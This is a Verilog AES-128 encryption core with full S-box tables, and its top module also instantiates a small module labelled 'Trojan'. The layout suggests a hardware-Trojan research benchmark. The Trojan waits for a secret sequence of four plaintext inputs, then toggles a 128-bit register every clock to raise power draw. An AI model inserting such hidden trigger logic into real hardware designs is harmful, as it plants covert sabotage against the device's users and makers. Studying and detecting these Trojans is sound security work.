module aes_128 (
	clk,
	state,
	key,
	out
);
	input clk;
	input [127:0] state;
	input [127:0] key;
	output wire [127:0] out;
	reg [127:0] s0;
	reg [127:0] k0;
	wire [127:0] s1;
	wire [127:0] s2;
	wire [127:0] s3;
	wire [127:0] s4;
	wire [127:0] s5;
	wire [127:0] s6;
	wire [127:0] s7;
	wire [127:0] s8;
	wire [127:0] s9;
	wire [127:0] k1;
	wire [127:0] k2;
	wire [127:0] k3;
	wire [127:0] k4;
	wire [127:0] k5;
	wire [127:0] k6;
	wire [127:0] k7;
	wire [127:0] k8;
	wire [127:0] k9;
	wire [127:0] k10;
	wire [127:0] k0b;
	wire [127:0] k1b;
	wire [127:0] k2b;
	wire [127:0] k3b;
	wire [127:0] k4b;
	wire [127:0] k5b;
	wire [127:0] k6b;
	wire [127:0] k7b;
	wire [127:0] k8b;
	wire [127:0] k9b;
	always @(posedge clk) begin
		s0 <= state ^ key;
		k0 <= key;
	end
	expand_key_128 a1(
		.clk(clk),
		.in(k0),
		.out_1(k1),
		.out_2(k0b),
		.rcon(8'h01)
	);
	expand_key_128 a2(
		.clk(clk),
		.in(k1),
		.out_1(k2),
		.out_2(k1b),
		.rcon(8'h02)
	);
	expand_key_128 a3(
		.clk(clk),
		.in(k2),
		.out_1(k3),
		.out_2(k2b),
		.rcon(8'h04)
	);
	expand_key_128 a4(
		.clk(clk),
		.in(k3),
		.out_1(k4),
		.out_2(k3b),
		.rcon(8'h08)
	);
	expand_key_128 a5(
		.clk(clk),
		.in(k4),
		.out_1(k5),
		.out_2(k4b),
		.rcon(8'h10)
	);
	expand_key_128 a6(
		.clk(clk),
		.in(k5),
		.out_1(k6),
		.out_2(k5b),
		.rcon(8'h20)
	);
	expand_key_128 a7(
		.clk(clk),
		.in(k6),
		.out_1(k7),
		.out_2(k6b),
		.rcon(8'h40)
	);
	expand_key_128 a8(
		.clk(clk),
		.in(k7),
		.out_1(k8),
		.out_2(k7b),
		.rcon(8'h80)
	);
	expand_key_128 a9(
		.clk(clk),
		.in(k8),
		.out_1(k9),
		.out_2(k8b),
		.rcon(8'h1b)
	);
	expand_key_128 a10(
		.clk(clk),
		.in(k9),
		.out_1(k10),
		.out_2(k9b),
		.rcon(8'h36)
	);
	one_round r1(
		.clk(clk),
		.state_in(s0),
		.key(k0b),
		.state_out(s1)
	);
	one_round r2(
		.clk(clk),
		.state_in(s1),
		.key(k1b),
		.state_out(s2)
	);
	one_round r3(
		.clk(clk),
		.state_in(s2),
		.key(k2b),
		.state_out(s3)
	);
	one_round r4(
		.clk(clk),
		.state_in(s3),
		.key(k3b),
		.state_out(s4)
	);
	one_round r5(
		.clk(clk),
		.state_in(s4),
		.key(k4b),
		.state_out(s5)
	);
	one_round r6(
		.clk(clk),
		.state_in(s5),
		.key(k5b),
		.state_out(s6)
	);
	one_round r7(
		.clk(clk),
		.state_in(s6),
		.key(k6b),
		.state_out(s7)
	);
	one_round r8(
		.clk(clk),
		.state_in(s7),
		.key(k7b),
		.state_out(s8)
	);
	one_round r9(
		.clk(clk),
		.state_in(s8),
		.key(k8b),
		.state_out(s9)
	);
	final_round rf(
		.clk(clk),
		.state_in(s9),
		.key_in(k9b),
		.state_out(out)
	);
endmodule
module expand_key_128 (
	clk,
	in,
	out_1,
	out_2,
	rcon
);
	input clk;
	input [127:0] in;
	input [7:0] rcon;
	output reg [127:0] out_1;
	output wire [127:0] out_2;
	wire [31:0] k0;
	wire [31:0] k1;
	wire [31:0] k2;
	wire [31:0] k3;
	wire [31:0] v0;
	wire [31:0] v1;
	wire [31:0] v2;
	wire [31:0] v3;
	reg [31:0] k0a;
	reg [31:0] k1a;
	reg [31:0] k2a;
	reg [31:0] k3a;
	wire [31:0] k0b;
	wire [31:0] k1b;
	wire [31:0] k2b;
	wire [31:0] k3b;
	wire [31:0] k4a;
	assign k0 = in[127:96];
	assign k1 = in[95:64];
	assign k2 = in[63:32];
	assign k3 = in[31:0];
	assign v0 = {k0[31:24] ^ rcon, k0[23:0]};
	assign v1 = v0 ^ k1;
	assign v2 = v1 ^ k2;
	assign v3 = v2 ^ k3;
	always @(posedge clk) begin
		k0a <= v0;
		k1a <= v1;
		k2a <= v2;
		k3a <= v3;
	end
	S4 S4_0(
		.clk(clk),
		.in({k3[23:0], k3[31:24]}),
		.out(k4a)
	);
	assign k0b = k0a ^ k4a;
	assign k1b = k1a ^ k4a;
	assign k2b = k2a ^ k4a;
	assign k3b = k3a ^ k4a;
	always @(posedge clk) out_1 <= {k0b, k1b, k2b, k3b};
	assign out_2 = {k0b, k1b, k2b, k3b};
endmodule
module one_round (
	clk,
	state_in,
	key,
	state_out
);
	input clk;
	input [127:0] state_in;
	input [127:0] key;
	output reg [127:0] state_out;
	wire [31:0] s0;
	wire [31:0] s1;
	wire [31:0] s2;
	wire [31:0] s3;
	wire [31:0] z0;
	wire [31:0] z1;
	wire [31:0] z2;
	wire [31:0] z3;
	wire [31:0] p00;
	wire [31:0] p01;
	wire [31:0] p02;
	wire [31:0] p03;
	wire [31:0] p10;
	wire [31:0] p11;
	wire [31:0] p12;
	wire [31:0] p13;
	wire [31:0] p20;
	wire [31:0] p21;
	wire [31:0] p22;
	wire [31:0] p23;
	wire [31:0] p30;
	wire [31:0] p31;
	wire [31:0] p32;
	wire [31:0] p33;
	wire [31:0] k0;
	wire [31:0] k1;
	wire [31:0] k2;
	wire [31:0] k3;
	assign k0 = key[127:96];
	assign k1 = key[95:64];
	assign k2 = key[63:32];
	assign k3 = key[31:0];
	assign s0 = state_in[127:96];
	assign s1 = state_in[95:64];
	assign s2 = state_in[63:32];
	assign s3 = state_in[31:0];
	table_lookup t0(
		.clk(clk),
		.state(s0),
		.p0(p00),
		.p1(p01),
		.p2(p02),
		.p3(p03)
	);
	table_lookup t1(
		.clk(clk),
		.state(s1),
		.p0(p10),
		.p1(p11),
		.p2(p12),
		.p3(p13)
	);
	table_lookup t2(
		.clk(clk),
		.state(s2),
		.p0(p20),
		.p1(p21),
		.p2(p22),
		.p3(p23)
	);
	table_lookup t3(
		.clk(clk),
		.state(s3),
		.p0(p30),
		.p1(p31),
		.p2(p32),
		.p3(p33)
	);
	assign z0 = (((p00 ^ p11) ^ p22) ^ p33) ^ k0;
	assign z1 = (((p03 ^ p10) ^ p21) ^ p32) ^ k1;
	assign z2 = (((p02 ^ p13) ^ p20) ^ p31) ^ k2;
	assign z3 = (((p01 ^ p12) ^ p23) ^ p30) ^ k3;
	always @(posedge clk) state_out <= {z0, z1, z2, z3};
endmodule
module final_round (
	clk,
	state_in,
	key_in,
	state_out
);
	input clk;
	input [127:0] state_in;
	input [127:0] key_in;
	output reg [127:0] state_out;
	wire [31:0] s0;
	wire [31:0] s1;
	wire [31:0] s2;
	wire [31:0] s3;
	wire [31:0] z0;
	wire [31:0] z1;
	wire [31:0] z2;
	wire [31:0] z3;
	wire [31:0] k0;
	wire [31:0] k1;
	wire [31:0] k2;
	wire [31:0] k3;
	wire [7:0] p00;
	wire [7:0] p01;
	wire [7:0] p02;
	wire [7:0] p03;
	wire [7:0] p10;
	wire [7:0] p11;
	wire [7:0] p12;
	wire [7:0] p13;
	wire [7:0] p20;
	wire [7:0] p21;
	wire [7:0] p22;
	wire [7:0] p23;
	wire [7:0] p30;
	wire [7:0] p31;
	wire [7:0] p32;
	wire [7:0] p33;
	assign k0 = key_in[127:96];
	assign k1 = key_in[95:64];
	assign k2 = key_in[63:32];
	assign k3 = key_in[31:0];
	assign s0 = state_in[127:96];
	assign s1 = state_in[95:64];
	assign s2 = state_in[63:32];
	assign s3 = state_in[31:0];
	S4 S4_1(
		.clk(clk),
		.in(s0),
		.out({p00, p01, p02, p03})
	);
	S4 S4_2(
		.clk(clk),
		.in(s1),
		.out({p10, p11, p12, p13})
	);
	S4 S4_3(
		.clk(clk),
		.in(s2),
		.out({p20, p21, p22, p23})
	);
	S4 S4_4(
		.clk(clk),
		.in(s3),
		.out({p30, p31, p32, p33})
	);
	assign z0 = {p00, p11, p22, p33} ^ k0;
	assign z1 = {p10, p21, p32, p03} ^ k1;
	assign z2 = {p20, p31, p02, p13} ^ k2;
	assign z3 = {p30, p01, p12, p23} ^ k3;
	always @(posedge clk) state_out <= {z0, z1, z2, z3};
endmodule
module table_lookup (
	clk,
	state,
	p0,
	p1,
	p2,
	p3
);
	input clk;
	input [31:0] state;
	output wire [31:0] p0;
	output wire [31:0] p1;
	output wire [31:0] p2;
	output wire [31:0] p3;
	wire [7:0] b0;
	wire [7:0] b1;
	wire [7:0] b2;
	wire [7:0] b3;
	wire [31:0] k0;
	wire [31:0] k1;
	wire [31:0] k2;
	assign p0 = {k0[7:0], k0[31:8]};
	assign p1 = {k1[15:0], k1[31:16]};
	assign p2 = {k2[23:0], k2[31:24]};
	assign b0 = state[31:24];
	assign b1 = state[23:16];
	assign b2 = state[15:8];
	assign b3 = state[7:0];
	T t0(
		.clk(clk),
		.in(b0),
		.out(k0)
	);
	T t1(
		.clk(clk),
		.in(b1),
		.out(k1)
	);
	T t2(
		.clk(clk),
		.in(b2),
		.out(k2)
	);
	T t3(
		.clk(clk),
		.in(b3),
		.out(p3)
	);
endmodule
module S4 (
	clk,
	in,
	out
);
	input clk;
	input [31:0] in;
	output wire [31:0] out;
	wire [7:0] k0;
	wire [7:0] k1;
	wire [7:0] k2;
	wire [7:0] k3;
	S S_0(
		.clk(clk),
		.in(in[31:24]),
		.out(k0)
	);
	S S_1(
		.clk(clk),
		.in(in[23:16]),
		.out(k1)
	);
	S S_2(
		.clk(clk),
		.in(in[15:8]),
		.out(k2)
	);
	S S_3(
		.clk(clk),
		.in(in[7:0]),
		.out(k3)
	);
	assign out = {k0, k1, k2, k3};
endmodule
module T (
	clk,
	in,
	out
);
	input clk;
	input [7:0] in;
	output wire [31:0] out;
	wire [7:0] k0;
	wire [7:0] k1;
	S s0(
		.clk(clk),
		.in(in),
		.out(k0)
	);
	xS s4(
		.clk(clk),
		.in(in),
		.out(k1)
	);
	assign out = {k0, k0, k0 ^ k1, k1};
endmodule
module S (
	clk,
	in,
	out
);
	input clk;
	input [7:0] in;
	output reg [7:0] out;
	always @(posedge clk)
		case (in)
			8'h00: out <= 8'h63;
			8'h01: out <= 8'h7c;
			8'h02: out <= 8'h77;
			8'h03: out <= 8'h7b;
			8'h04: out <= 8'hf2;
			8'h05: out <= 8'h6b;
			8'h06: out <= 8'h6f;
			8'h07: out <= 8'hc5;
			8'h08: out <= 8'h30;
			8'h09: out <= 8'h01;
			8'h0a: out <= 8'h67;
			8'h0b: out <= 8'h2b;
			8'h0c: out <= 8'hfe;
			8'h0d: out <= 8'hd7;
			8'h0e: out <= 8'hab;
			8'h0f: out <= 8'h76;
			8'h10: out <= 8'hca;
			8'h11: out <= 8'h82;
			8'h12: out <= 8'hc9;
			8'h13: out <= 8'h7d;
			8'h14: out <= 8'hfa;
			8'h15: out <= 8'h59;
			8'h16: out <= 8'h47;
			8'h17: out <= 8'hf0;
			8'h18: out <= 8'had;
			8'h19: out <= 8'hd4;
			8'h1a: out <= 8'ha2;
			8'h1b: out <= 8'haf;
			8'h1c: out <= 8'h9c;
			8'h1d: out <= 8'ha4;
			8'h1e: out <= 8'h72;
			8'h1f: out <= 8'hc0;
			8'h20: out <= 8'hb7;
			8'h21: out <= 8'hfd;
			8'h22: out <= 8'h93;
			8'h23: out <= 8'h26;
			8'h24: out <= 8'h36;
			8'h25: out <= 8'h3f;
			8'h26: out <= 8'hf7;
			8'h27: out <= 8'hcc;
			8'h28: out <= 8'h34;
			8'h29: out <= 8'ha5;
			8'h2a: out <= 8'he5;
			8'h2b: out <= 8'hf1;
			8'h2c: out <= 8'h71;
			8'h2d: out <= 8'hd8;
			8'h2e: out <= 8'h31;
			8'h2f: out <= 8'h15;
			8'h30: out <= 8'h04;
			8'h31: out <= 8'hc7;
			8'h32: out <= 8'h23;
			8'h33: out <= 8'hc3;
			8'h34: out <= 8'h18;
			8'h35: out <= 8'h96;
			8'h36: out <= 8'h05;
			8'h37: out <= 8'h9a;
			8'h38: out <= 8'h07;
			8'h39: out <= 8'h12;
			8'h3a: out <= 8'h80;
			8'h3b: out <= 8'he2;
			8'h3c: out <= 8'heb;
			8'h3d: out <= 8'h27;
			8'h3e: out <= 8'hb2;
			8'h3f: out <= 8'h75;
			8'h40: out <= 8'h09;
			8'h41: out <= 8'h83;
			8'h42: out <= 8'h2c;
			8'h43: out <= 8'h1a;
			8'h44: out <= 8'h1b;
			8'h45: out <= 8'h6e;
			8'h46: out <= 8'h5a;
			8'h47: out <= 8'ha0;
			8'h48: out <= 8'h52;
			8'h49: out <= 8'h3b;
			8'h4a: out <= 8'hd6;
			8'h4b: out <= 8'hb3;
			8'h4c: out <= 8'h29;
			8'h4d: out <= 8'he3;
			8'h4e: out <= 8'h2f;
			8'h4f: out <= 8'h84;
			8'h50: out <= 8'h53;
			8'h51: out <= 8'hd1;
			8'h52: out <= 8'h00;
			8'h53: out <= 8'hed;
			8'h54: out <= 8'h20;
			8'h55: out <= 8'hfc;
			8'h56: out <= 8'hb1;
			8'h57: out <= 8'h5b;
			8'h58: out <= 8'h6a;
			8'h59: out <= 8'hcb;
			8'h5a: out <= 8'hbe;
			8'h5b: out <= 8'h39;
			8'h5c: out <= 8'h4a;
			8'h5d: out <= 8'h4c;
			8'h5e: out <= 8'h58;
			8'h5f: out <= 8'hcf;
			8'h60: out <= 8'hd0;
			8'h61: out <= 8'hef;
			8'h62: out <= 8'haa;
			8'h63: out <= 8'hfb;
			8'h64: out <= 8'h43;
			8'h65: out <= 8'h4d;
			8'h66: out <= 8'h33;
			8'h67: out <= 8'h85;
			8'h68: out <= 8'h45;
			8'h69: out <= 8'hf9;
			8'h6a: out <= 8'h02;
			8'h6b: out <= 8'h7f;
			8'h6c: out <= 8'h50;
			8'h6d: out <= 8'h3c;
			8'h6e: out <= 8'h9f;
			8'h6f: out <= 8'ha8;
			8'h70: out <= 8'h51;
			8'h71: out <= 8'ha3;
			8'h72: out <= 8'h40;
			8'h73: out <= 8'h8f;
			8'h74: out <= 8'h92;
			8'h75: out <= 8'h9d;
			8'h76: out <= 8'h38;
			8'h77: out <= 8'hf5;
			8'h78: out <= 8'hbc;
			8'h79: out <= 8'hb6;
			8'h7a: out <= 8'hda;
			8'h7b: out <= 8'h21;
			8'h7c: out <= 8'h10;
			8'h7d: out <= 8'hff;
			8'h7e: out <= 8'hf3;
			8'h7f: out <= 8'hd2;
			8'h80: out <= 8'hcd;
			8'h81: out <= 8'h0c;
			8'h82: out <= 8'h13;
			8'h83: out <= 8'hec;
			8'h84: out <= 8'h5f;
			8'h85: out <= 8'h97;
			8'h86: out <= 8'h44;
			8'h87: out <= 8'h17;
			8'h88: out <= 8'hc4;
			8'h89: out <= 8'ha7;
			8'h8a: out <= 8'h7e;
			8'h8b: out <= 8'h3d;
			8'h8c: out <= 8'h64;
			8'h8d: out <= 8'h5d;
			8'h8e: out <= 8'h19;
			8'h8f: out <= 8'h73;
			8'h90: out <= 8'h60;
			8'h91: out <= 8'h81;
			8'h92: out <= 8'h4f;
			8'h93: out <= 8'hdc;
			8'h94: out <= 8'h22;
			8'h95: out <= 8'h2a;
			8'h96: out <= 8'h90;
			8'h97: out <= 8'h88;
			8'h98: out <= 8'h46;
			8'h99: out <= 8'hee;
			8'h9a: out <= 8'hb8;
			8'h9b: out <= 8'h14;
			8'h9c: out <= 8'hde;
			8'h9d: out <= 8'h5e;
			8'h9e: out <= 8'h0b;
			8'h9f: out <= 8'hdb;
			8'ha0: out <= 8'he0;
			8'ha1: out <= 8'h32;
			8'ha2: out <= 8'h3a;
			8'ha3: out <= 8'h0a;
			8'ha4: out <= 8'h49;
			8'ha5: out <= 8'h06;
			8'ha6: out <= 8'h24;
			8'ha7: out <= 8'h5c;
			8'ha8: out <= 8'hc2;
			8'ha9: out <= 8'hd3;
			8'haa: out <= 8'hac;
			8'hab: out <= 8'h62;
			8'hac: out <= 8'h91;
			8'had: out <= 8'h95;
			8'hae: out <= 8'he4;
			8'haf: out <= 8'h79;
			8'hb0: out <= 8'he7;
			8'hb1: out <= 8'hc8;
			8'hb2: out <= 8'h37;
			8'hb3: out <= 8'h6d;
			8'hb4: out <= 8'h8d;
			8'hb5: out <= 8'hd5;
			8'hb6: out <= 8'h4e;
			8'hb7: out <= 8'ha9;
			8'hb8: out <= 8'h6c;
			8'hb9: out <= 8'h56;
			8'hba: out <= 8'hf4;
			8'hbb: out <= 8'hea;
			8'hbc: out <= 8'h65;
			8'hbd: out <= 8'h7a;
			8'hbe: out <= 8'hae;
			8'hbf: out <= 8'h08;
			8'hc0: out <= 8'hba;
			8'hc1: out <= 8'h78;
			8'hc2: out <= 8'h25;
			8'hc3: out <= 8'h2e;
			8'hc4: out <= 8'h1c;
			8'hc5: out <= 8'ha6;
			8'hc6: out <= 8'hb4;
			8'hc7: out <= 8'hc6;
			8'hc8: out <= 8'he8;
			8'hc9: out <= 8'hdd;
			8'hca: out <= 8'h74;
			8'hcb: out <= 8'h1f;
			8'hcc: out <= 8'h4b;
			8'hcd: out <= 8'hbd;
			8'hce: out <= 8'h8b;
			8'hcf: out <= 8'h8a;
			8'hd0: out <= 8'h70;
			8'hd1: out <= 8'h3e;
			8'hd2: out <= 8'hb5;
			8'hd3: out <= 8'h66;
			8'hd4: out <= 8'h48;
			8'hd5: out <= 8'h03;
			8'hd6: out <= 8'hf6;
			8'hd7: out <= 8'h0e;
			8'hd8: out <= 8'h61;
			8'hd9: out <= 8'h35;
			8'hda: out <= 8'h57;
			8'hdb: out <= 8'hb9;
			8'hdc: out <= 8'h86;
			8'hdd: out <= 8'hc1;
			8'hde: out <= 8'h1d;
			8'hdf: out <= 8'h9e;
			8'he0: out <= 8'he1;
			8'he1: out <= 8'hf8;
			8'he2: out <= 8'h98;
			8'he3: out <= 8'h11;
			8'he4: out <= 8'h69;
			8'he5: out <= 8'hd9;
			8'he6: out <= 8'h8e;
			8'he7: out <= 8'h94;
			8'he8: out <= 8'h9b;
			8'he9: out <= 8'h1e;
			8'hea: out <= 8'h87;
			8'heb: out <= 8'he9;
			8'hec: out <= 8'hce;
			8'hed: out <= 8'h55;
			8'hee: out <= 8'h28;
			8'hef: out <= 8'hdf;
			8'hf0: out <= 8'h8c;
			8'hf1: out <= 8'ha1;
			8'hf2: out <= 8'h89;
			8'hf3: out <= 8'h0d;
			8'hf4: out <= 8'hbf;
			8'hf5: out <= 8'he6;
			8'hf6: out <= 8'h42;
			8'hf7: out <= 8'h68;
			8'hf8: out <= 8'h41;
			8'hf9: out <= 8'h99;
			8'hfa: out <= 8'h2d;
			8'hfb: out <= 8'h0f;
			8'hfc: out <= 8'hb0;
			8'hfd: out <= 8'h54;
			8'hfe: out <= 8'hbb;
			8'hff: out <= 8'h16;
		endcase
endmodule
module xS (
	clk,
	in,
	out
);
	input clk;
	input [7:0] in;
	output reg [7:0] out;
	always @(posedge clk)
		case (in)
			8'h00: out <= 8'hc6;
			8'h01: out <= 8'hf8;
			8'h02: out <= 8'hee;
			8'h03: out <= 8'hf6;
			8'h04: out <= 8'hff;
			8'h05: out <= 8'hd6;
			8'h06: out <= 8'hde;
			8'h07: out <= 8'h91;
			8'h08: out <= 8'h60;
			8'h09: out <= 8'h02;
			8'h0a: out <= 8'hce;
			8'h0b: out <= 8'h56;
			8'h0c: out <= 8'he7;
			8'h0d: out <= 8'hb5;
			8'h0e: out <= 8'h4d;
			8'h0f: out <= 8'hec;
			8'h10: out <= 8'h8f;
			8'h11: out <= 8'h1f;
			8'h12: out <= 8'h89;
			8'h13: out <= 8'hfa;
			8'h14: out <= 8'hef;
			8'h15: out <= 8'hb2;
			8'h16: out <= 8'h8e;
			8'h17: out <= 8'hfb;
			8'h18: out <= 8'h41;
			8'h19: out <= 8'hb3;
			8'h1a: out <= 8'h5f;
			8'h1b: out <= 8'h45;
			8'h1c: out <= 8'h23;
			8'h1d: out <= 8'h53;
			8'h1e: out <= 8'he4;
			8'h1f: out <= 8'h9b;
			8'h20: out <= 8'h75;
			8'h21: out <= 8'he1;
			8'h22: out <= 8'h3d;
			8'h23: out <= 8'h4c;
			8'h24: out <= 8'h6c;
			8'h25: out <= 8'h7e;
			8'h26: out <= 8'hf5;
			8'h27: out <= 8'h83;
			8'h28: out <= 8'h68;
			8'h29: out <= 8'h51;
			8'h2a: out <= 8'hd1;
			8'h2b: out <= 8'hf9;
			8'h2c: out <= 8'he2;
			8'h2d: out <= 8'hab;
			8'h2e: out <= 8'h62;
			8'h2f: out <= 8'h2a;
			8'h30: out <= 8'h08;
			8'h31: out <= 8'h95;
			8'h32: out <= 8'h46;
			8'h33: out <= 8'h9d;
			8'h34: out <= 8'h30;
			8'h35: out <= 8'h37;
			8'h36: out <= 8'h0a;
			8'h37: out <= 8'h2f;
			8'h38: out <= 8'h0e;
			8'h39: out <= 8'h24;
			8'h3a: out <= 8'h1b;
			8'h3b: out <= 8'hdf;
			8'h3c: out <= 8'hcd;
			8'h3d: out <= 8'h4e;
			8'h3e: out <= 8'h7f;
			8'h3f: out <= 8'hea;
			8'h40: out <= 8'h12;
			8'h41: out <= 8'h1d;
			8'h42: out <= 8'h58;
			8'h43: out <= 8'h34;
			8'h44: out <= 8'h36;
			8'h45: out <= 8'hdc;
			8'h46: out <= 8'hb4;
			8'h47: out <= 8'h5b;
			8'h48: out <= 8'ha4;
			8'h49: out <= 8'h76;
			8'h4a: out <= 8'hb7;
			8'h4b: out <= 8'h7d;
			8'h4c: out <= 8'h52;
			8'h4d: out <= 8'hdd;
			8'h4e: out <= 8'h5e;
			8'h4f: out <= 8'h13;
			8'h50: out <= 8'ha6;
			8'h51: out <= 8'hb9;
			8'h52: out <= 8'h00;
			8'h53: out <= 8'hc1;
			8'h54: out <= 8'h40;
			8'h55: out <= 8'he3;
			8'h56: out <= 8'h79;
			8'h57: out <= 8'hb6;
			8'h58: out <= 8'hd4;
			8'h59: out <= 8'h8d;
			8'h5a: out <= 8'h67;
			8'h5b: out <= 8'h72;
			8'h5c: out <= 8'h94;
			8'h5d: out <= 8'h98;
			8'h5e: out <= 8'hb0;
			8'h5f: out <= 8'h85;
			8'h60: out <= 8'hbb;
			8'h61: out <= 8'hc5;
			8'h62: out <= 8'h4f;
			8'h63: out <= 8'hed;
			8'h64: out <= 8'h86;
			8'h65: out <= 8'h9a;
			8'h66: out <= 8'h66;
			8'h67: out <= 8'h11;
			8'h68: out <= 8'h8a;
			8'h69: out <= 8'he9;
			8'h6a: out <= 8'h04;
			8'h6b: out <= 8'hfe;
			8'h6c: out <= 8'ha0;
			8'h6d: out <= 8'h78;
			8'h6e: out <= 8'h25;
			8'h6f: out <= 8'h4b;
			8'h70: out <= 8'ha2;
			8'h71: out <= 8'h5d;
			8'h72: out <= 8'h80;
			8'h73: out <= 8'h05;
			8'h74: out <= 8'h3f;
			8'h75: out <= 8'h21;
			8'h76: out <= 8'h70;
			8'h77: out <= 8'hf1;
			8'h78: out <= 8'h63;
			8'h79: out <= 8'h77;
			8'h7a: out <= 8'haf;
			8'h7b: out <= 8'h42;
			8'h7c: out <= 8'h20;
			8'h7d: out <= 8'he5;
			8'h7e: out <= 8'hfd;
			8'h7f: out <= 8'hbf;
			8'h80: out <= 8'h81;
			8'h81: out <= 8'h18;
			8'h82: out <= 8'h26;
			8'h83: out <= 8'hc3;
			8'h84: out <= 8'hbe;
			8'h85: out <= 8'h35;
			8'h86: out <= 8'h88;
			8'h87: out <= 8'h2e;
			8'h88: out <= 8'h93;
			8'h89: out <= 8'h55;
			8'h8a: out <= 8'hfc;
			8'h8b: out <= 8'h7a;
			8'h8c: out <= 8'hc8;
			8'h8d: out <= 8'hba;
			8'h8e: out <= 8'h32;
			8'h8f: out <= 8'he6;
			8'h90: out <= 8'hc0;
			8'h91: out <= 8'h19;
			8'h92: out <= 8'h9e;
			8'h93: out <= 8'ha3;
			8'h94: out <= 8'h44;
			8'h95: out <= 8'h54;
			8'h96: out <= 8'h3b;
			8'h97: out <= 8'h0b;
			8'h98: out <= 8'h8c;
			8'h99: out <= 8'hc7;
			8'h9a: out <= 8'h6b;
			8'h9b: out <= 8'h28;
			8'h9c: out <= 8'ha7;
			8'h9d: out <= 8'hbc;
			8'h9e: out <= 8'h16;
			8'h9f: out <= 8'had;
			8'ha0: out <= 8'hdb;
			8'ha1: out <= 8'h64;
			8'ha2: out <= 8'h74;
			8'ha3: out <= 8'h14;
			8'ha4: out <= 8'h92;
			8'ha5: out <= 8'h0c;
			8'ha6: out <= 8'h48;
			8'ha7: out <= 8'hb8;
			8'ha8: out <= 8'h9f;
			8'ha9: out <= 8'hbd;
			8'haa: out <= 8'h43;
			8'hab: out <= 8'hc4;
			8'hac: out <= 8'h39;
			8'had: out <= 8'h31;
			8'hae: out <= 8'hd3;
			8'haf: out <= 8'hf2;
			8'hb0: out <= 8'hd5;
			8'hb1: out <= 8'h8b;
			8'hb2: out <= 8'h6e;
			8'hb3: out <= 8'hda;
			8'hb4: out <= 8'h01;
			8'hb5: out <= 8'hb1;
			8'hb6: out <= 8'h9c;
			8'hb7: out <= 8'h49;
			8'hb8: out <= 8'hd8;
			8'hb9: out <= 8'hac;
			8'hba: out <= 8'hf3;
			8'hbb: out <= 8'hcf;
			8'hbc: out <= 8'hca;
			8'hbd: out <= 8'hf4;
			8'hbe: out <= 8'h47;
			8'hbf: out <= 8'h10;
			8'hc0: out <= 8'h6f;
			8'hc1: out <= 8'hf0;
			8'hc2: out <= 8'h4a;
			8'hc3: out <= 8'h5c;
			8'hc4: out <= 8'h38;
			8'hc5: out <= 8'h57;
			8'hc6: out <= 8'h73;
			8'hc7: out <= 8'h97;
			8'hc8: out <= 8'hcb;
			8'hc9: out <= 8'ha1;
			8'hca: out <= 8'he8;
			8'hcb: out <= 8'h3e;
			8'hcc: out <= 8'h96;
			8'hcd: out <= 8'h61;
			8'hce: out <= 8'h0d;
			8'hcf: out <= 8'h0f;
			8'hd0: out <= 8'he0;
			8'hd1: out <= 8'h7c;
			8'hd2: out <= 8'h71;
			8'hd3: out <= 8'hcc;
			8'hd4: out <= 8'h90;
			8'hd5: out <= 8'h06;
			8'hd6: out <= 8'hf7;
			8'hd7: out <= 8'h1c;
			8'hd8: out <= 8'hc2;
			8'hd9: out <= 8'h6a;
			8'hda: out <= 8'hae;
			8'hdb: out <= 8'h69;
			8'hdc: out <= 8'h17;
			8'hdd: out <= 8'h99;
			8'hde: out <= 8'h3a;
			8'hdf: out <= 8'h27;
			8'he0: out <= 8'hd9;
			8'he1: out <= 8'heb;
			8'he2: out <= 8'h2b;
			8'he3: out <= 8'h22;
			8'he4: out <= 8'hd2;
			8'he5: out <= 8'ha9;
			8'he6: out <= 8'h07;
			8'he7: out <= 8'h33;
			8'he8: out <= 8'h2d;
			8'he9: out <= 8'h3c;
			8'hea: out <= 8'h15;
			8'heb: out <= 8'hc9;
			8'hec: out <= 8'h87;
			8'hed: out <= 8'haa;
			8'hee: out <= 8'h50;
			8'hef: out <= 8'ha5;
			8'hf0: out <= 8'h03;
			8'hf1: out <= 8'h59;
			8'hf2: out <= 8'h09;
			8'hf3: out <= 8'h1a;
			8'hf4: out <= 8'h65;
			8'hf5: out <= 8'hd7;
			8'hf6: out <= 8'h84;
			8'hf7: out <= 8'hd0;
			8'hf8: out <= 8'h82;
			8'hf9: out <= 8'h29;
			8'hfa: out <= 8'h5a;
			8'hfb: out <= 8'h1e;
			8'hfc: out <= 8'h7b;
			8'hfd: out <= 8'ha8;
			8'hfe: out <= 8'h6d;
			8'hff: out <= 8'h2c;
		endcase
endmodule
module top (
	clk,
	rst,
	state,
	key,
	out
);
	input clk;
	input rst;
	input [127:0] state;
	input [127:0] key;
	output wire [127:0] out;
	aes_128 AES(
		.clk(clk),
		.state(state),
		.key(key),
		.out(out)
	);
	TSC Trojan(
		.clk(clk),
		.rst(rst),
		.state(state)
	);
endmodule
module TSC (
	clk,
	rst,
	state
);
	input clk;
	input rst;
	input [127:0] state;
	reg [127:0] DynamicPower;
	reg State0;
	reg State1;
	reg State2;
	reg State3;
	reg Tj_Trig;
	always @(rst or clk)
		if (rst == 1'b1)
			DynamicPower <= 128'haaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;
		else if (Tj_Trig == 1'b1) begin
			DynamicPower <= {DynamicPower[0], DynamicPower[127:1]};
			$display("horrific");
		end
	always @(rst or state)
		if (rst == 1'b1) begin
			State0 <= 1'b0;
			State1 <= 1'b0;
			State2 <= 1'b0;
			State3 <= 1'b0;
		end
		else if (state == 128'h3243f6a8885a308d313198a2e0370734)
			State0 <= 1'b1;
		else if ((state == 128'h00112233445566778899aabbccddeeff) && (State0 == 1'b1))
			State1 <= 1'b1;
		else if ((state == 128'h00000000000000000000000000000000) && (State1 == 1'b1))
			State2 <= 1'b1;
		else if ((state == 128'h00000000000000000000000000000001) && (State2 == 1'b1))
			State3 <= 1'b1;
	always @(State0 or State1 or State2 or State3) Tj_Trig <= ((State0 & State1) & State2) & State3;
endmodule
